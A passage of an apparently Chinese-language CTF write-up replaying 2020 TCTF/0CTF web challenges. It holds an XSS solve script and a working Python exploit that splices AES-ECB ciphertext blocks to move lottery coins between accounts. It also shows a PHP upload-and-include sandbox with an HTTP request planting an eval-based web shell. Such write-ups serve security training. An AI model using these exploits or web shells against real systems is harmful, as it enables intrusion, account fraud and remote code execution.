&#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line">print(png_link)</span><br><span class="line">print(svg_link)</span><br><span class="line"># visit_png &#x3D; requests.get(png_link) # Trigger the HTTP request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Stage 2: get the flag</span><br><span class="line"></span><br><span class="line">def admin(link):</span><br><span class="line"> data &#x3D; &#123;</span><br><span class="line">   &#39;url&#39;: link</span><br><span class="line"> &#125;</span><br><span class="line"> response &#x3D; requests.post(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#x2F;SUp3r_S3cret_URL&#x2F;0Nly_4dM1n_Kn0ws&#39;, data&#x3D;data)</span><br><span class="line"> print(response.text)</span><br><span class="line"></span><br><span class="line">   injected_previewid &#x3D; &quot;&quot;&quot;&#39; + alert(1); b &#x3D; &#123;&#39;c&#39;: &quot; &quot;&quot;&quot;</span><br><span class="line">   url &#x3D; share(injected_previewid)</span><br><span class="line">   png_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;png&quot; # This URL returns an error which we can manipulate with callback</span><br><span class="line">   </span><br><span class="line">   malicious_link &#x3D; f&quot;&#123;png_link&#125;?callback&#x3D;a&#x3D;&#39;&quot;</span><br><span class="line"></span><br><span class="line">svg_data &#x3D; &#39;[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;Love you!&quot;&#125;,&#123;&quot;type&quot;:1,&quot;message&quot;:&quot;[lmfao.png\\&quot;&#x2F;&gt; &lt;script xlink:href&#x3D;\\&quot;&#39; + malicious_link + &#39;\\&quot; &#x2F;&gt; ] &quot;&#125;]&#39;</span><br><span class="line">previewid, data &#x3D; preview(svg_data)</span><br><span class="line">url &#x3D; share(previewid)</span><br><span class="line">svg_link &#x3D; f&quot;&#123;url.replace(&#39;share&#39;, &#39;image&#39;)&#125;&#x2F;svg&quot;</span><br><span class="line"></span><br><span class="line">path_only &#x3D; svg_link.replace(&#39;http:&#x2F;&#x2F;pwnable.org:5000&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line">admin(path_only)</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/blob/master/2020_tctf/wechat_solve.py</a></p>
+</blockquote>
+<h1 id="0x03-lottery"><a href="#0x03-lottery" class="headerlink" title="0x03 lottery"></a>0x03 lottery</h1><p><a href="http://pwnable.org:2333/index.html" target="_blank" rel="noopener">http://pwnable.org:2333/index.html</a></p>
+<p>有如下几个路由：</p>
+<p>uer/register 注册</p>
+<p>user/login 登录</p>
+<p>lottery/buy  用钱买彩票，可以得到enc</p>
+<p>lottery/info  得到enc解密消息,包括userid  lotteryid  coin</p>
+<p>lottery/charge 兑换</p>
+<p>修改coin和userid都不可以，那么就是要分析密文了。找几组enc，base64解密后变成十六进制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc1 &#x3D; &quot;uO3FId8cC%2FcMSJWDrHEIrWAiUTho2AhhKiG8qMm97OFT7u7T1iP3G69pp6bKzzskQdhwNiABgT0Z7DMcD6Ak4gw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmfZKdxFMoBME3TgxrN8viG%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc2 &#x3D; &quot;V3evI3E%2FuuiKZWrHEZ3oqoMNZp9ANL4LMFX2VtEfxIwBI8hEQRsYMDIA68eFNVSFaHSV4HX%2F1rpZXB%2BS1ml48Aw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc3 &#x3D; &quot;JoWNsPteqpYQPCeb4qyZmKW9YY7N4nmipnLhp5VnnKkYDhRSv4mKCV3MQ4AKjQlcBw%2F%2BpM3dZ9ZZDCFz4XXvEww7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmseX2ZnXgak2Q9%2BrPTFTzTPbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br><span class="line">enc4 &#x3D; &quot;wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">b8edc521df1c0bf70c489583ac7108ad6022513868d808612a21bca8c9bdece153eeeed3d623f71baf69a7a6cacf3b2441d870362001813d19ec331c0fa024e20c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964667d929dc4532804c1374e0c6b37cbe21bf6d2b7dade603f007022388485ecc598</span><br><span class="line">b8edc521df1c0bf70c489583ac7108ad</span><br><span class="line">6022513868d808612a21bca8c9bdece1</span><br><span class="line">53eeeed3d623f71baf69a7a6cacf3b24</span><br><span class="line">41d870362001813d19ec331c0fa024e2</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">7d929dc4532804c1374e0c6b37cbe21b</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5777af23713fbae88a656ac7119de8aa830d669f4034be0b3055f656d11fc48c0123c844411b18303200ebc785355485687495e075ffd6ba595c1f92d66978f00c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">5777af23713fbae88a656ac7119de8aa</span><br><span class="line">830d669f4034be0b3055f656d11fc48c</span><br><span class="line">0123c844411b18303200ebc785355485</span><br><span class="line">687495e075ffd6ba595c1f92d66978f0</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">26858db0fb5eaa96103c279be2ac9998a5bd618ecde279a2a672e1a795679ca9180e1452bf898a095dcc43800a8d095c070ffea4cddd67d6590c2173e175ef130c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e96466b1e5f66675e06a4d90f7eacf4c54f34cf6d2b7dade603f007022388485ecc598</span><br><span class="line">26858db0fb5eaa96103c279be2ac9998</span><br><span class="line">a5bd618ecde279a2a672e1a795679ca9</span><br><span class="line">180e1452bf898a095dcc43800a8d095c</span><br><span class="line">070ffea4cddd67d6590c2173e175ef13</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">b1e5f66675e06a4d90f7eacf4c54f34c</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c071efd119736dc5f986316b99c0781275fd3c34f5dc7502ea445c41e3a1dada079c202fc88f8d7e2efc27085003fffb0881be893940b20c623c6797913546020c3b3db74db7e3647354d53a59c27f76ee2438352d584ffba6fca405e3e964664bde76dde29699e1b8c6717fd58ad043f6d2b7dade603f007022388485ecc598</span><br><span class="line">c071efd119736dc5f986316b99c07812</span><br><span class="line">75fd3c34f5dc7502ea445c41e3a1dada</span><br><span class="line">079c202fc88f8d7e2efc27085003fffb</span><br><span class="line">0881be893940b20c623c679791354602</span><br><span class="line">0c3b3db74db7e3647354d53a59c27f76</span><br><span class="line">ee2438352d584ffba6fca405e3e96466</span><br><span class="line">4bde76dde29699e1b8c6717fd58ad043</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">可以看出是分组密码，采用的是ECB模式</span><br><span class="line">每组有16字节，128位</span><br><span class="line">密文共有8组，128字节</span><br></pre></td></tr></table></figure>
+
+<p>因为有/info可以解密，所以可以测试分组的规律。</p>
+<p>用两个user、coin相同的，lottery不同来判断lottery的位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">xSjWMxj9VTzGLTnYR00pWHlHT2e8CKzrh%2FQg%2BWyPIBrS6pwgQBUKDEmb1toU1j08LWID2CcmlHmD3tPtP4H2dh6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;fd79618b-2579-4c60-ad38-a9efea2be4ed&quot;,&quot;user&quot;:&quot;8e60dd01-be04-4932-a1c6-7eb70d57423a&quot;,&quot;coin&quot;:6&#125;&#125;</span><br><span class="line"></span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817bc484876df19e1dabf1a3cd82145e8620ab02a9bb13d5025347c5fa7a18baf1716779ef22fbcc7c6f0a12b32d99267cf1ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">9fadf817fbbb686631c3cb2fdcddf817</span><br><span class="line">bc484876df19e1dabf1a3cd82145e862</span><br><span class="line">0ab02a9bb13d5025347c5fa7a18baf17</span><br><span class="line">16779ef22fbcc7c6f0a12b32d99267cf</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c528d63318fd553cc62d39d8474d295879474f67bc08aceb87f420f96c8f201ad2ea9c2040150a0c499bd6da14d63d3c2d6203d82726947983ded3ed3f81f6761ea7d309e9b5b894cbeef6f5f73370d6af1705cbdf106a424f439d958f5fcabe799fcc7cb88d4159bf740954f776814df6d2b7dade603f007022388485ecc598</span><br><span class="line">c528d63318fd553cc62d39d8474d2958</span><br><span class="line">79474f67bc08aceb87f420f96c8f201a</span><br><span class="line">d2ea9c2040150a0c499bd6da14d63d3c</span><br><span class="line">2d6203d82726947983ded3ed3f81f676</span><br><span class="line">1ea7d309e9b5b894cbeef6f5f73370d6</span><br><span class="line">af1705cbdf106a424f439d958f5fcabe</span><br><span class="line">799fcc7cb88d4159bf740954f776814d</span><br><span class="line">f6d2b7dade603f007022388485ecc598</span><br></pre></td></tr></table></figure>
+
+<p>后四组相同，说明第四组中含有lottery，可能含有user的userid（无法找到只有userid不同的两个enc）,可以用找两个userid不同的enc，base解密后，第一个的前四组和第二个的后四组拼接在一起发送，看是否成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"n634F%2Fu7aGYxw8sv3N34F7xISHbfGeHavxo82CFF6GIKsCqbsT1QJTR8X6ehi68XFnee8i%2B8x8bwoSsy2ZJnzx6n0wnptbiUy%2B729fczcNavFwXL3xBqQk9DnZWPX8q%2BeZ%2FMfLiNQVm%2FdAlU93aBTfbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e60dd01-be04-4932-a1c6-7eb70d57423a","coin":6&#125;&#125;</span></span><br><span class="line">enc2 = <span class="string">"wHHv0RlzbcX5hjFrmcB4EnX9PDT13HUC6kRcQeOh2toHnCAvyI%2BNfi78JwhQA%2F%2F7CIG%2BiTlAsgxiPGeXkTVGAgw7PbdNt%2BNkc1TVOlnCf3buJDg1LVhP%2B6b8pAXj6WRmS9523eKWmeG4xnF%2F1YrQQ%2FbSt9reYD8AcCI4hIXsxZg%3D"</span></span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"f838f210-9932-4d6a-98ae-9d22758c2554","user":"263020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"><span class="keyword">print</span> ci1+<span class="string">"\n"</span></span><br><span class="line">ci2 = b64decode(unquote(enc2))</span><br><span class="line"><span class="keyword">print</span> ci2+<span class="string">"\n"</span></span><br><span class="line">ci3 = ci1[:<span class="number">64</span>]+ci2[<span class="number">64</span>:]</span><br><span class="line"><span class="keyword">print</span> ci1[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">print</span> ci2[<span class="number">64</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> b64encode(ci3)</span><br><span class="line">data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line"><span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data).text</span><br><span class="line"><span class="comment">#&#123;"info":&#123;"lottery":"6a564b59-1a3b-4ecc-aaa1-3bd1b2cfe7b3","user":"8e3020e2-8add-4c0c-a5dc-4659556890e5","coin":2&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>从上面可以看出解密得到的结果</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707085633140.png" alt="image-20200707085633140"></p>
+<p>加密时分组的第四组包括userid的前两位，所以只要注册几个userid的前两位相同的用户，然后将买到彩票得到的enc后四组全部替换到一个user,就可以把钱都转移到一个user中。</p>
+<ol>
+<li><p>注册得到一个uuid开头是76的用户，保存他买彩票得到的enc。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;enc&quot;:&quot;Ht3U37\&#x2F;f5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem+107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz\&#x2F;VxMdT9mIEQ2hBe+qQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ\&#x2F;H0kmQaeAAqobYPhIZnVHgXwIkkuehhS\&#x2F;11g&#x3D;&quot;&#125;</span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;7443b465-8661-4770-8942-d7d4fc5ec47c&quot;,&quot;user&quot;:&quot;7638b0fb-7651-4c68-a02e-dc1753a2eb10&quot;,&quot;coin&quot;:10&#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>继续注册寻找uuid开头为76的用户，找到就买彩票（可以买三次），将得到的enc base64解密后前四组，加上前面得到用户enc base64解密的后四组，去charge。</p>
+</li>
+<li><p>之后买flag</p>
+</li>
+</ol>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://pwnable.org:2333/"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:<span class="string">"abcdefg"</span>&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/register"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password=<span class="string">"abcdefg"</span>)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"user/login"</span>,data = data,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"user"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/buy"</span>,data = data,cookies=cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> json.loads(re.text)[<span class="string">"enc"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(enc,apitoken)</span>:</span></span><br><span class="line">	data = &#123;<span class="string">"user"</span>:<span class="string">"7638b0fb-7651-4c68-a02e-dc1753a2eb10"</span>,<span class="string">"coin"</span>:<span class="string">"10"</span>,<span class="string">"enc"</span>:enc&#125;</span><br><span class="line">	cookie = &#123;<span class="string">"api_token"</span>:apitoken&#125;</span><br><span class="line">	re = requests.post(url+<span class="string">"lottery/charge"</span>,data = data,cookies = cookie,proxies=proxy)</span><br><span class="line">	<span class="keyword">return</span> re.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc1 = <span class="string">"Ht3U37%2Ff5B2DfJue3XduaO9fK591DAP7mCPmZu13mZKmem%2B107YSQA07GKGGrezJlzhJ3cBJCvdxwpLj4N3dz%2FVxMdT9mIEQ2hBe%2BqQKHtagwQ3B2ZAN9gvW2j57Xpqp8zuNPhJ%2FH0kmQaeAAqobYPhIZnVHgXwIkkuehhS%2F11g%3D"</span></span><br><span class="line">ci1 = b64decode(unquote(enc1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	username = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">10</span>))</span><br><span class="line">	user = register(username)</span><br><span class="line">	<span class="keyword">print</span> user[<span class="string">"uuid"</span>]</span><br><span class="line">	tmp = <span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(user[<span class="string">"uuid"</span>][:<span class="number">2</span>] == <span class="string">"76"</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			user = login(username)</span><br><span class="line">			enc = buy(user[<span class="string">"api_token"</span>])</span><br><span class="line">			ci2 = b64decode(unquote(enc))</span><br><span class="line">			ci3 = ci2[:<span class="number">64</span>]+ci1[<span class="number">64</span>:]</span><br><span class="line">			data = &#123;<span class="string">"enc"</span>:b64encode(ci3)&#125;</span><br><span class="line">			<span class="keyword">print</span> requests.post(<span class="string">"http://pwnable.org:2333/lottery/info"</span>,data=data,proxies=proxy).text</span><br><span class="line">			<span class="keyword">print</span> charge(b64encode(ci3),user[<span class="string">"api_token"</span>])</span><br><span class="line">			tmp +=<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> tmp &gt; <span class="number">6</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707100729914.png" alt="image-20200707100729914"></p>
+<p>nu1l做法：</p>
+<p>任意注册账号，只要info[“lottery”]后两位为f6，然后拼接原user的enc。</p>
+<p><img src="/2020/07/01/2020TCTF0CTFWeb%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20200707103111591.png" alt="image-20200707103111591"></p>
+<blockquote>
+<p>个人感觉出现漏洞的原因是在兑换彩票时，服务器没有检查兑换彩票的人是不是买彩票的人。应该禁止线上代理兑换彩票。</p>
+</blockquote>
+<h1 id="0x04-Cloud-Computing"><a href="#0x04-Cloud-Computing" class="headerlink" title="0x04 Cloud Computing"></a>0x04 Cloud Computing</h1><p>sandbox/0d3875a1ef234783393169ab868290f038826727/</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">'sandbox/'</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) . <span class="string">'/'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($dir))&#123;</span><br><span class="line">  mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">"action"</span>] ?? <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'pwd'</span>:</span><br><span class="line">    <span class="keyword">echo</span> $dir;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'upload'</span>:</span><br><span class="line">    $data = $_GET[<span class="string">"data"</span>] ?? <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (waf($data)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'waf sucks...'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="string">"$dir"</span> . <span class="string">"index.php"</span>, $data);</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'shell'</span>:</span><br><span class="line">    initShellEnv($dir);</span><br><span class="line">    <span class="keyword">include</span> $dir . <span class="string">"index.php"</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有报错，过滤了很多利用eval(end(getallheaders()));</p>
+<blockquote>
+<p>利用error_reporting(-1);开启报错。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;eval(end(getallheaders())); HTTP&#x2F;1.1</span><br><span class="line">Host: pwnable.org:47780</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.149 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7,zh-TW;q&#x3D;0.6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line">Connection: eval($_POST[cmd]);</span><br><span class="line"></span><br><span class="line">cmd&#x3D;error_reporting(-1);echo 233;</span><br></pre></td></tr></table></figure>
+
+<p>不能看phpinfo()，利用报错可以知道有open_basedir限制，因为在sandbox里可以新建文件夹，然后</p>
